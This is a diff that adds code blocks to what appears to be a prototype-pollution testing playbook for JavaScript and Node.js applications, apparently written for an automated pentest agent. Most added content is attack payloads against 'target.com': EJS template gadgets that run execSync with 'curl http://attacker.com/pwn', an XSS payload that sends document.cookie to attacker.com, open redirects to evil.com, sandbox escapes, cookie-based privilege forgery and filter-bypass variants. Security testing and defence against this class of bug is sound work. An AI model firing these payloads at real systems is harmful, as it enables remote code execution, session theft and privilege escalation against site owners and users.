@@ -33,6 +33,16 @@ owaspRefs: ["OWASP Top 10 A03:2021 Injection"]
 
 ### Quick Decision Tree:
 
+```
+User JSON input
+  └─> Does any code deep-merge / clone / extend it into an existing object?
+        ├─ NO  → stop (no pollution path)
+        └─ YES → send {"__proto__":{"pp_detect":"x"}}
+              ├─ property appears on fresh objects → POLLUTED → hunt gadget sinks
+              │     (innerHTML, redirect URL, template opts, sandbox methods)
+              └─ filtered → retry {"constructor":{"prototype":{...}}}
+                    └─ still blocked → try qs-style ?__proto__[x]=y, array wrap, unicode
+```
 ## 2. Auth Context
 
 ### Prototype Pollution Authentication Requirements:
@@ -44,6 +54,13 @@ owaspRefs: ["OWASP Top 10 A03:2021 Injection"]
 
 ### Auth-Aware Strategy:
 
+```
+Unauthenticated  → POST /api/merge, /api/import, query-string qs parsing: test first
+Authenticated    → profile/settings PUTs with your session cookie
+Admin-only       → template/bulk-import endpoints (need admin token)
+Cookie-borne     → inject polluted JSON into cookie values the app parses+merges
+JWT claims       → merge-prone claims (__proto__ inside a decoded claim object)
+```
 ## 3. Basic Prototype Pollution
 
 ### Core Concept:
@@ -56,10 +73,33 @@ Note: `Object.assign` is safe against `__proto__` pollution because it only copi
 
 **`lodash.merge` / `lodash.defaultsDeep` (vulnerable):**
 
+```javascript
+const _ = require('lodash');
+_.merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
+console.log(({}).isAdmin);   // true — every new object is polluted
+```
+
 **`deepmerge` npm package (vulnerable in older versions):**
+
+```javascript
+const deepmerge = require('deepmerge');
+deepmerge({}, {"__proto__": {"polluted": "yes"}});
+({}).polluted;   // "yes" on versions without the __proto__ guard
+```
 
 **Manual recursive merge (vulnerable):**
 
+```javascript
+function merge(target, source) {
+  for (let key in source) {
+    if (typeof source[key] === 'object' && key in target) {
+      merge(target[key], source[key]);
+    } else {
+      target[key] = source[key];   // writes through obj.__proto__ when key === '__proto__'
+    }
+  }
+}
+```
 **Spread operator with nesting (NOT vulnerable):**
 
 ### The `__proto__` Key Mechanism:
@@ -69,14 +109,63 @@ When JavaScript parses `{"__proto__":{"isAdmin":true}}`, the `__proto__` key is 
 
 ### Basic Detection Payload:
 
+```http
+POST /api/settings HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{"__proto__": {"pp_detect": "unique-1234"}}
+```
+
+```http
+# constructor.prototype alternative vector
+POST /api/settings HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{"constructor": {"prototype": {"pp_detect": "unique-1234"}}}
+```
+
+```bash
+# Query-string vector (Express + qs)
+curl -sk "https://target.com/search?__proto__[pp_detect]=unique-1234"
+curl -sk "https://target.com/search?constructor[prototype][pp_detect]=unique-1234"
+```
+
 ### Detection Methodology:
 
 **Step 1: Inject and verify property existence:**
 
+```http
+POST /api/settings HTTP/1.1
+Content-Type: application/json
+
+{"__proto__": {"pp_detect": "x"}}
+```
+
+Then trigger an endpoint that creates a fresh object and echoes it:
+
+```bash
+curl -sk "https://target.com/api/echo-defaults"
+# Response contains "pp_detect":"x" → pollution confirmed
+```
+
 **Step 2: Verify via JavaScript evaluation:**
+
+```javascript
+// In the browser console or evaluateRendered context:
+({}).pp_detect          // "x" — inherited from Object.prototype
+Object.keys({}).includes('pp_detect')            // false (inherited, not own)
+'pp_detect' in {}                                // true
+```
 
 **Step 3: Confirm persistence:**
 
+```javascript
+// Fresh objects created AFTER the payload must inherit the key:
+const a = {}; const b = new Object(); const c = JSON.parse('{}');
+a.pp_detect === b.pp_detect && b.pp_detect === c.pp_detect;   // all "x"
+```
 ### Detection Heuristics:
 1. Send unique test string: `{"__proto__":{"pp_detect_<timestamp>":"value"}}` — if property appears on new objects, pollution confirmed
 2. Check response for merge behavior: does the server merge your input into an existing object and return the result?
@@ -100,6 +189,12 @@ When JavaScript parses `{"__proto__":{"isAdmin":true}}`, the `__proto__` key is 
 ### XSS via `innerHTML` Sink:
 When prototype-polluted properties flow into `innerHTML` assignments:
 
+```http
+POST /api/settings HTTP/1.1
+Content-Type: application/json
+
+{"__proto__": {"innerHTML": "<img src=x onerror=alert(document.domain)>"}}
+```
 
 **Trigger chain:**
 1. Pollute `Object.prototype.innerHTML` with XSS payload
@@ -108,28 +203,63 @@ When prototype-polluted properties flow into `innerHTML` assignments:
 
 **Verification:**
 
+```javascript
+// evaluateRendered after pollution — check the sink consumed the prototype value
+document.body.innerHTML.includes('onerror=alert');   // true when gadget fired
+```
 ### XSS via Template Rendering:
 
 **EJS template exploitation:**
 
 EJS reads `options.settings.outputFunctionName` from the template context. If prototype-polluted, it injects code into the template function.
 
+```http
+POST /api/render HTTP/1.1
+Content-Type: application/json
+
+{"__proto__": {"outputFunctionName": "x; process.mainModule.require('child_process').execSync('curl http://attacker.com/pwn'); s"}}
+```
+
+```javascript
+// Server-side gadget (EJS compile step reads polluted option):
+// var outputFunctionName = opts.outputFunctionName  → concatenated into generated function source → eval
+```
+
 **Pug (Jade) exploitation:**
 
 Pug reads `settings.doctype` from the context — pollution can alter template behavior.
+
+```json
+{"__proto__": {"self": true, "doctype": "html", "block": {"type": "Text", "val": "x"}}}
+```
 
 **Handlebars exploitation:**
 
 Handlebars uses prototype lookup — pollution can bypass sandbox restrictions.
 
+```json
+{"__proto__": {"type": "Program", "body": [{"type": "MustacheStatement", "path": 0, "params": [{"type": "SubExpression"}]}]}}
+```
+
 ### Open Redirect via URL Properties:
 
+```http
+POST /api/settings HTTP/1.1
+Content-Type: application/json
+
+{"__proto__": {"url": "https://evil.com"}}
+```
 
 **Trigger chain:**
 1. Pollute `Object.prototype.url` or `redirectUrl`
 2. Application checks `req.query.url || defaults.url` — prototype provides poisoned value
 3. Redirect fires: `response.redirect(target.url)` → attacker-controlled destination
 
+```javascript
+// Vulnerable sink pattern:
+const target = config.redirectUrl || 'https://target.com/thanks';
+res.redirect(target);   // config object inherits polluted redirectUrl
+```
 **Alternative property names:**
 - `url`, `redirectUrl`, `returnUrl`, `next`, `destination`, `location`, `href`, `target`
 - Test each: many frameworks use specific property names for redirect logic
@@ -143,6 +273,19 @@ If `element.style` or CSS object properties are populated from user-controlled o
 ### `constructor.prototype` Vector:
 When `__proto__` is filtered, use `constructor.prototype` as an alternative:
 
+```http
+POST /api/settings HTTP/1.1
+Content-Type: application/json
+
+{"constructor": {"prototype": {"pp_detect": "x"}}}
+```
+
+```javascript
+// Equivalent JS: writes to the same prototype object as __proto__
+let obj = {};
+obj.constructor.prototype.polluted = 'yes';
+({}).polluted;   // "yes"
+```
 
 **How it works:**
 1. Every object has a `constructor` property pointing to its constructor function
@@ -151,23 +294,76 @@ When `__proto__` is filtered, use `constructor.prototype` as an alternative:
 
 ### Filter Bypass with `constructor`:
 
+```json
+{"__pro\u0074o__": {"polluted": "yes"}}
+{"constructor": {"prototype": {"polluted": "yes"}}}
+{"const\x72uctor": {"prototype": {"polluted": "yes"}}}
+```
+
 ### `constructor` in Merge Operations:
+
+```javascript
+// Nested merge reaching the Function constructor chain
+merge({}, JSON.parse('{"constructor":{"prototype":{"isAdmin":true}}}'));
+```
 
 ### Detection for Constructor Vector:
 
+```bash
+curl -sk https://target.com/api/settings \
+  -H "Content-Type: application/json" \
+  -d '{"constructor":{"prototype":{"pp_ctor":"x"}}}'
+# Then re-check /api/echo-defaults for pp_ctor on fresh objects
+```
 ## 7. Node.js / Express
 
 ### `qs` Library Pollution:
 The `qs` library (used by Express for query string parsing) has known prototype pollution vectors:
 
+```bash
+# Bracket syntax creates nested keys that reach __proto__
+curl -sk "https://target.com/search?__proto__[polluted]=yes"
+curl -sk "https://target.com/search?constructor[prototype][polluted]=yes"
+
+# Array + bracket combos
+curl -sk "https://target.com/search?__proto__[]=x&__proto__[polluted]=yes"
+```
 
 **Exploitation:**
 
+```http
+GET /search?__proto__[isAdmin]=true HTTP/1.1
+Host: target.com
+
+<!-- qs < 6.5.3 parses this into {__proto__: {isAdmin: true}} which a subsequent merge writes through -->
+```
+
 **`qs` specific vectors:**
 
+```
+?__proto__[x]=1
+?constructor=Object&constructor[prototype][x]=1
+?__proto__[%00]=1                       # null-byte key quirks in old qs
+?a[__proto__][b][__proto__][c]=deep     # deep nesting
+```
 ### Body Parser Exploitation:
 
 **Common vulnerable patterns in Express:**
+
+```javascript
+// express.json() passes parsed objects straight to vulnerable merge code:
+app.post('/api/settings', (req, res) => {
+  _.merge(userSettings, req.body);   // req.body.__proto__ → Object.prototype
+  res.json(userSettings);
+});
+```
+
+```http
+POST /api/settings HTTP/1.1
+Content-Type: application/json
+
+{"__proto__": {"status": "admin", "role": 1}}
+```
 
 ### Express-Specific Detection:
 1. Send `{"__proto__":{"polluted":"test"}}` to POST endpoints accepting JSON
@@ -175,37 +371,66 @@ The `qs` library (used by Express for query string parsing) has known prototype 
 3. Test query string pollution: `?__proto__[polluted]=test` on GET endpoints
 4. Check for `qs` version — `qs` < 6.5.3, < 6.4.1, < 6.3.2 are vulnerable to prototype pollution
 5. Test `body-parser` versions < 1.18.3 — known pollution vectors
-
 ### Server-Side Template Injection via Prototype Pollution:
+
+```json
+{"__proto__": {"outputFunctionName": "x1; return global.process.mainModule.constructor._load('child_process').execSync('id').toString(); x2"}}
+```
+
+```javascript
+// EJS render call after pollution executes the injected function source:
+ejs.render(template, {});
+// Generated source becomes: let x1; ... execSync('id') ... ; let x2;
+```
 
 ## 8. Sandbox Escape
 
 ### VM2 Sandbox Escape:
 VM2 isolates JavaScript execution but prototype pollution can escape:
 
+```javascript
+const { VM } = require('vm2');
+const vm = new VM();
+// Pollute inside the sandbox, then trigger host-context execution:
+vm.run(`
+  const pollution = () => ({});
+  pollution.__proto__.env = process.env;   // if host objects leak in
+`);
+```
 
 **Escape chain:**
 1. Pollute `Object.prototype` with a getter that executes in host context
 2. Sandbox code accesses a property triggering the getter
 3. Getter function runs outside the sandbox
 4. Achieve RCE via `process.mainModule.require('child_process').execSync('cmd')`
-
 ### `Object.prototype.ISPrototypeOf` Override:
+
+```javascript
+// Pollute isPrototypeOf to defeat sandbox type checks
+{"__proto__": {"isPrototypeOf": function(x){ return true; }}}
+```
 
 **Mechanism:**
 1. Override `ISPrototypeOf` on the prototype
 2. Code that checks `Object.prototype.ISPrototypeOf.call(a, b)` gets poisoned
 3. Security checks relying on prototype chain inspection fail
 4. Sandbox assumes object is legitimate → escapes sandbox restrictions
-
 ### `toString` Method Override:
+
+```javascript
+// JSON-borne pollution of toString with a gadget body
+{"__proto__": {"toString": "global.process.mainModule.require('child_process').execSync('curl http://attacker.com/pwn')"}}
+```
 
 **Mechanism:**
 1. Override `Object.prototype.toString` with a function that executes code
 2. Any string coercion in the sandbox triggers the function
 3. `console.log(obj)` → `toString()` called → code executes in host context
-
 ### `valueOf` Method Override:
+
+```javascript
+{"__proto__": {"valueOf": "process.mainModule.require('child_process').execSync('id')"}}
+```
 
 **Mechanism:**
 1. Override `Object.prototype.valueOf`
@@ -214,8 +439,24 @@ VM2 isolates JavaScript execution but prototype pollution can escape:
 
 ### Symbol Pollution for Sandbox Escape:
 
+```javascript
+// Pollute well-known symbols to hijack coercion paths
+{"__proto__": {"Symbol.toPrimitive": "exec gadget"}}
+```
+
+```json
+{"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/environ"}, "shell": "Node"}}
+```
+
 ### Escape Verification:
 
+```javascript
+// Confirm host-context execution after pollution:
+// 1. Send pollution payload with a callback command (curl/DNS)
+// 2. Trigger sandbox code that coerces any object (String(obj), `${obj}`, obj + 1)
+// 3. Observe the OOB callback — that is the escape proof
+console.log(`${({})}`);   // triggers toString/valueOf chain
+```
 ## 9. Client-Side Exploitation
 
 ### DOM Clobbering + Prototype Pollution:
@@ -223,11 +464,31 @@ Combine DOM clobbering with prototype pollution for enhanced exploitation:
 
 **Step 1: Poison prototype with DOM sink properties:**
 
+```http
+POST /api/prefs HTTP/1.1
+Content-Type: application/json
+
+{"__proto__": {"innerHTML": "<img src=x onerror=fetch('https://attacker.com/'+document.cookie)>"}}
+```
+
 **Step 2: Trigger DOM clobbering that reads polluted properties:**
+
+```html
+<!-- Anchor clobbering makes document.URL a DOM element instead of a string -->
+<a id="URL"><a id="hostname">evil</a></a>
+```
 
 **Step 3: Application reads `element.innerHTML` from clobbered DOM + poisoned prototype:**
 
+```javascript
+// Vulnerable client code pattern:
+el.innerHTML = config.innerHTML;   // inherits the polluted prototype value
+```
 ### localStorage Poisoning:
+
+```json
+{"__proto__": {"getItem": "admin", "token": "forged-session-value"}}
+```
 
 **Trigger chain:**
 1. Pollute `Object.prototype.localStorage` with attacker-controlled data
@@ -236,9 +497,20 @@ Combine DOM clobbering with prototype pollution for enhanced exploitation:
 
 ### Cookie Poisoning via Prototype:
 
+```http
+Cookie: prefs={"__proto__":{"isAuthenticated":true,"role":"admin"}}
+```
+
 If the application reads `req.cookie` or merges cookies into objects, this can override authentication state.
 
 ### DOM Property Pollution for XSS:
+
+```javascript
+// Pollute then let any DOM sink consume the prototype value:
+Object.prototype.src = "//evil.com/xss.js";
+Object.prototype.href = "javascript:alert(1)";
+Object.prototype.action = "https://evil.com/collect";
+```
 
 **Common DOM sinks to test:**
 - `element.innerHTML` — Direct HTML injection
@@ -252,6 +524,14 @@ If the application reads `req.cookie` or merges cookies into objects, this can o
 
 ### Client-Side Detection:
 
+```javascript
+// Paste in console after visiting the app with pollution params:
+({}).polluted !== undefined;   // true = client-side merge consumed input
+
+// Check common client-side entry points:
+// hash/query: #__proto__[x]=1, ?__proto__[x]=1 → JSON.parse of location data merged into state
+// postMessage: window.addEventListener('message', e => deepMerge(state, e.data))
+```
 ## 10. Filter Bypass
 
 ### Blocked Keywords and Alternatives:
@@ -271,18 +551,57 @@ If the application reads `req.cookie` or merges cookies into objects, this can o
 
 **Unicode escape sequences:**
 
+```json
+{"__pro\u0074o__": {"polluted": "yes"}}
+{"\u005f\u005fproto__": {"polluted": "yes"}}
+```
+
 **Double URL encoding:**
+
+```
+?__proto__%255Bpolluted%255D=yes      # %255B -> %5B -> [
+%5F%5Fproto__%5Bx%5D=1
+```
 
 **Null byte injection:**
 
+```
+?__proto__[%00polluted]=1
+{"__proto__\u0000": {"x": 1}}
+```
+
 **Key name variations:**
+
+```json
+{"constructor": {"prototype": {"polluted": "yes"}}}
+{"ConsTructor": {"ProtoType": {"polluted": "yes"}}}
+```
 
 ### Nested Pollution Bypass:
 
+```json
+{"a": {"b": {"c": {"__proto__": {"polluted": "yes"}}}}}
+{"level1": {"__proto__": {"level2": {"__proto__": {"deep": true}}}}}
+```
 ### Array-Based Pollution:
 
+```json
+[{"__proto__": {"polluted": "yes"}}]
+{"items": [{"__proto__": {"polluted": "yes"}}, {"normal": "item"}]}
+```
+
+```javascript
+// Array.prototype pollution vector (affects .map/.forEach on all arrays):
+{"__proto__": {"length": 100}}   // can corrupt array iteration logic
+```
+
 ### JSONP Callback Bypass:
-If the server includes JSONP callback wrapping, the pollution payload may be processed differently.
+
+```
+/callback?jsonp=cb&data={"__proto__":{"polluted":"yes"}}
+// Response: cb({"__proto__":{"polluted":"yes"}})
+// If client code merges the parsed data into app state, pollution fires client-side
+```
 
 ## 11. Anti-Hallucination
 
@@ -313,6 +632,16 @@ If the server includes JSONP callback wrapping, the pollution payload may be pro
 - **Chain evidence**: Complete flow from HTTP request → merge operation → prototype pollution → sink trigger → security impact
 
 ### Verification Protocol:
+
+```javascript
+// 1. Send pollution payload
+// POST {"__proto__":{"pp_verify":"x"}}
+// 2. Create fresh objects and check inheritance:
+({}).pp_verify === 'x';                    // prototype lookup succeeds
+Object.getOwnPropertyDescriptor(Object.prototype, 'pp_verify') !== undefined;  // own prop on prototype
+// 3. Confirm the sink consumed it (example: redirect gadget)
+// 4. Capture request → merge → pollution → sink → impact as evidence chain
+```
 
 ### Common False Positives:
 - Property exists as own property on specific object (not prototype pollution)
